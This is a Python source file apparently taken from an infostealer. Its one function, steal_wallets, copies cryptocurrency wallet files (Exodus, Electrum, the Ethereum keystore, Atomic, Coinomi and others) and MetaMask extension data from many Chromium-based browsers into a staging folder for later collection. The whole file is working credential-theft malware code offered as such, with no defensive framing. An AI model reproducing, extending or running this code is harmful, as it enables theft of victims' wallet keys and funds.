import os
from shutil import copytree, rmtree


def steal_wallets():
    wallet_path = os.path.join(temp_path, "Wallets")
    os.makedirs(wallet_path, exist_ok=True)

    wallets = (
        ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
        ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
        ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
        ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
        ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
        ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
        ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
        ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
        ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
    )

    browser_paths = {
        "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
        "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
        "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
        "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
        "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
        "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
        "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
        "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
        "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
        "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
    }

    for name, path in wallets:
        if os.path.isdir(path):
            named_wallet_path = os.path.join(wallet_path, name)
            os.makedirs(named_wallet_path, exist_ok=True)
            try:
                if path != named_wallet_path:
                    copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
            except Exception:
                pass

    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == "Local Extension Settings":
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, "Metamask ({})".format(name))
                            named_wallet_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                                except Exception:
                                    pass
                                else:
                                    if not os.listdir(metamask_browser):
                                        rmtree(metamask_browser)
                                        